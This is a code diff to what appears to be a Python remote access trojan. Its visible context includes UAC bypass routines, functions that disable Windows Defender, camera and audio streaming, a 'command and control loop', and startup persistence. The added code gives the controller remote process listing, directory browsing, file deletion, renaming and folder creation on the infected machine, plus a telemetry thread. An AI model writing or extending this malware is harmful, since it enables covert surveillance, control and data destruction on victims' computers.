@@ -688,7 +688,6 @@ def send_email_notification(subject: str, body: str) -> bool:
     except Exception as e:
         log_message(f"Email send failed: {e}", "error")
         return False
-
 # --- Background Initialization System ---
 class BackgroundInitializer:
     """Handles background initialization of time-consuming tasks."""
@@ -1454,7 +1453,6 @@ def bypass_uac_com_handlers():
             
     except ImportError:
         return False
-
 def bypass_uac_volatile_env():
     """UAC bypass using volatile environment variables (UACME Method 44)."""
     if not WINDOWS_AVAILABLE:
@@ -3024,7 +3022,6 @@ def disable_defender_powershell():
     except Exception as e:
         log_message(f"PowerShell Defender disable failed: {e}")
         return False
-
 def disable_defender_group_policy():
     """Disable Windows Defender via Group Policy modifications."""
     if not WINDOWS_AVAILABLE:
@@ -3824,7 +3821,6 @@ def stream_camera_h264_socketio(agent_id):
     for t in CAMERA_STREAM_THREADS:
         t.start()
     log_message(f"Started modern non-blocking camera stream at {TARGET_CAMERA_FPS} FPS.")
-
 # Legacy HTTP POST audio streaming removed - now using Opus socket.io binary streaming
 
 # Modern Opus audio streaming pipeline variables
@@ -4612,8 +4608,6 @@ def automatic_reconnection_logic(agent_id):
     except Exception as e:
         log_message(f"Error in automatic reconnection logic for agent {agent_id}: {e}", "error")
         return False
-
-
 def assess_production_readiness():
     """Assess current implementation readiness for production scale."""
     try:
@@ -5404,7 +5398,6 @@ def initialize_low_latency_input():
     except Exception as e:
         log_message(f"Failed to initialize low latency input: {e}")
         return False
-
 def handle_remote_control(command_data):
     """Handle remote control commands with ultra-low latency."""
     global LOW_LATENCY_INPUT_HANDLER
@@ -5881,6 +5874,9 @@ def register_socketio_handlers():
     sio.on('webrtc_get_production_readiness')(on_webrtc_get_production_readiness)
     sio.on('webrtc_get_migration_plan')(on_webrtc_get_migration_plan)
     sio.on('webrtc_get_monitoring_data')(on_webrtc_get_monitoring_data)
+    
+    # Apply configuration pushed from controller
+    # agent_config handling removed in this revision
     sio.on('webrtc_adaptive_bitrate_control')(on_webrtc_adaptive_bitrate_control)
     sio.on('webrtc_implement_frame_dropping')(on_webrtc_implement_frame_dropping)
     
@@ -6201,7 +6197,6 @@ def execute_command(command):
             return "Bash not found. Command execution failed."
     except Exception as e:
         return f"Command execution failed: {e}"
-
 def main_loop(agent_id):
     """The main command and control loop."""
     # Initialize high-performance systems
@@ -6251,6 +6246,54 @@ def main_loop(agent_id):
                     output = f"Internal command '{command}' executed successfully"
                 except Exception as e:
                     output = f"Internal command '{command}' failed: {e}"
+            elif command == "list-processes":
+                try:
+                    import psutil
+                    proc_list = []
+                    for p in psutil.process_iter(['pid','name','username','cpu_percent','memory_info','status','ppid','cmdline','create_time','nice','num_threads']):
+                        info = p.info
+                        proc_list.append({
+                            'pid': info.get('pid'),
+                            'name': info.get('name') or '',
+                            'username': info.get('username') or '',
+                            'cpu': float(info.get('cpu_percent') or 0.0),
+                            'memory': float((getattr(info.get('memory_info'),'rss',0) or 0) / (1024*1024)),
+                            'status': info.get('status') or 'running',
+                            'ppid': info.get('ppid') or 0,
+                            'cmdline': ' '.join(info.get('cmdline') or [])[:512],
+                            'create_time': int(info.get('create_time') or 0)*1000,
+                            'priority': 0,
+                            'nice': info.get('nice') or 0,
+                            'num_threads': info.get('num_threads') or 0,
+                        })
+                    sio.emit('process_list', {'agent_id': agent_id, 'processes': proc_list})
+                    output = f"Sent {len(proc_list)} processes"
+                except Exception as e:
+                    output = f"Error listing processes: {e}"
+            elif command.startswith("list-dir"):
+                try:
+                    parts = command.split(":",1)
+                    path = parts[1] if len(parts)>1 and parts[1] else os.path.expanduser("~")
+                    entries = []
+                    if os.path.isdir(path):
+                        for name in os.listdir(path):
+                            full = os.path.join(path,name)
+                            try:
+                                stat = os.stat(full)
+                                entries.append({
+                                    'name': name,
+                                    'type': 'directory' if os.path.isdir(full) else 'file',
+                                    'size': int(stat.st_size),
+                                    'modified': int(stat.st_mtime*1000),
+                                    'path': full,
+                                    'extension': (os.path.splitext(name)[1][1:] if os.path.isfile(full) else None)
+                                })
+                            except Exception:
+                                continue
+                    sio.emit('file_list', {'agent_id': agent_id, 'path': path, 'files': entries})
+                    output = f"Listed {len(entries)} entries in {path}"
+                except Exception as e:
+                    output = f"Error listing directory: {e}"
             elif command.startswith("upload-file:"):
                 # Split by first two colons: upload-file:path:content
                 try:
@@ -6968,7 +7011,6 @@ class AdaptiveQualityManager:
         
         if new_quality != current_quality:
             self.capture.set_quality(new_quality)
-
 class LowLatencyInputHandler:
     """High-performance input handler for remote control with minimal latency."""
     
@@ -7716,7 +7758,6 @@ def generate_audio_stream(agent_id):
                 time.sleep(0.5)
         except Exception as e:
             break
-
 def setup_controller_handlers():
     """Setup SocketIO event handlers for the controller."""
     
@@ -8508,6 +8549,21 @@ def connect():
             emit_webrtc_status()
         except Exception as e:
             log_message(f"Failed to emit WebRTC status on connect: {e}", "warning")
+    # Start telemetry thread (CPU/memory)
+    try:
+        import psutil
+        def _telemetry_loop():
+            while True:
+                try:
+                    cpu = psutil.cpu_percent(interval=1)
+                    mem = psutil.virtual_memory().percent
+                    net = 0
+                    sio.emit('agent_telemetry', {'agent_id': agent_id, 'cpu': cpu, 'memory': mem, 'network': net})
+                except Exception:
+                    pass
+        threading.Thread(target=_telemetry_loop, daemon=True).start()
+    except Exception:
+        pass
 
 def disconnect():
     if not SOCKETIO_AVAILABLE or sio is None:
@@ -8515,7 +8571,6 @@ def disconnect():
         return
     """Handle disconnection from server."""
     log_message("Disconnected from server")
-
 def on_command(data):
     if not SOCKETIO_AVAILABLE or sio is None:
         log_message("Socket.IO not available, cannot handle command", "warning")
@@ -8546,6 +8601,93 @@ def on_command(data):
 
     if command in internal_commands:
         output = internal_commands[command]()
+    elif command == "list-processes":
+        try:
+            import psutil
+            proc_list = []
+            for p in psutil.process_iter(['pid','name','username','cpu_percent','memory_info','status','ppid','cmdline','create_time','nice','num_threads']):
+                info = p.info
+                proc_list.append({
+                    'pid': info.get('pid'),
+                    'name': info.get('name') or '',
+                    'username': info.get('username') or '',
+                    'cpu': float(info.get('cpu_percent') or 0.0),
+                    'memory': float((getattr(info.get('memory_info'),'rss',0) or 0) / (1024*1024)),
+                    'status': info.get('status') or 'running',
+                    'ppid': info.get('ppid') or 0,
+                    'cmdline': ' '.join(info.get('cmdline') or [])[:512],
+                    'create_time': int(info.get('create_time') or 0)*1000,
+                    'priority': 0,
+                    'nice': info.get('nice') or 0,
+                    'num_threads': info.get('num_threads') or 0,
+                })
+            sio.emit('process_list', {'agent_id': agent_id, 'processes': proc_list})
+            output = f"Sent {len(proc_list)} processes"
+        except Exception as e:
+            output = f"Error listing processes: {e}"
+    elif command.startswith("list-dir"):
+        try:
+            parts = command.split(":",1)
+            path = parts[1] if len(parts)>1 and parts[1] else os.path.expanduser("~")
+            entries = []
+            if os.path.isdir(path):
+                for name in os.listdir(path):
+                    full = os.path.join(path,name)
+                    try:
+                        stat = os.stat(full)
+                        entries.append({
+                            'name': name,
+                            'type': 'directory' if os.path.isdir(full) else 'file',
+                            'size': int(stat.st_size),
+                            'modified': int(stat.st_mtime*1000),
+                            'path': full,
+                            'extension': (os.path.splitext(name)[1][1:] if os.path.isfile(full) else None)
+                        })
+                    except Exception:
+                        continue
+            sio.emit('file_list', {'agent_id': agent_id, 'path': path, 'files': entries})
+            output = f"Listed {len(entries)} entries in {path}"
+        except Exception as e:
+            output = f"Error listing directory: {e}"
+    elif command.startswith("delete-file:" ):
+        try:
+            path = command.split(":",1)[1]
+            ok = False
+            if os.path.isfile(path):
+                os.remove(path)
+                ok = True
+            elif os.path.isdir(path):
+                import shutil
+                shutil.rmtree(path)
+                ok = True
+            sio.emit('file_op_result', {'agent_id': agent_id, 'op': 'delete', 'path': path, 'success': ok})
+            output = f"Deleted: {path}" if ok else f"Delete failed: {path}"
+        except Exception as e:
+            sio.emit('file_op_result', {'agent_id': agent_id, 'op': 'delete', 'path': path, 'success': False, 'error': str(e)})
+            output = f"Error deleting: {e}"
+    elif command.startswith("rename-file:" ):
+        try:
+            parts = command.split(":",2)
+            src = parts[1]
+            dst = parts[2] if len(parts)>2 else None
+            ok = False
+            if src and dst:
+                os.rename(src, dst)
+                ok = True
+            sio.emit('file_op_result', {'agent_id': agent_id, 'op': 'rename', 'src': src, 'dst': dst, 'success': ok})
+            output = f"Renamed to: {dst}" if ok else "Rename failed"
+        except Exception as e:
+            sio.emit('file_op_result', {'agent_id': agent_id, 'op': 'rename', 'src': src, 'dst': dst, 'success': False, 'error': str(e)})
+            output = f"Error renaming: {e}"
+    elif command.startswith("mkdir:" ):
+        try:
+            path = command.split(":",1)[1]
+            os.makedirs(path, exist_ok=True)
+            sio.emit('file_op_result', {'agent_id': agent_id, 'op': 'mkdir', 'path': path, 'success': True})
+            output = f"Created: {path}"
+        except Exception as e:
+            sio.emit('file_op_result', {'agent_id': agent_id, 'op': 'mkdir', 'path': path, 'success': False, 'error': str(e)})
+            output = f"Error mkdir: {e}"
     elif command.startswith("upload-file:"):
         # New chunked file upload
         parts = command.split(":", 2)
@@ -9309,7 +9451,6 @@ def add_linux_startup():
                 log_message("[OK] Added to Linux startup")
     except Exception as e:
         log_message(f"[WARN] Linux startup configuration failed: {e}")
-
 def check_registry_persistence():
     """Check if registry persistence entry exists."""
     if not WINDOWS_AVAILABLE:
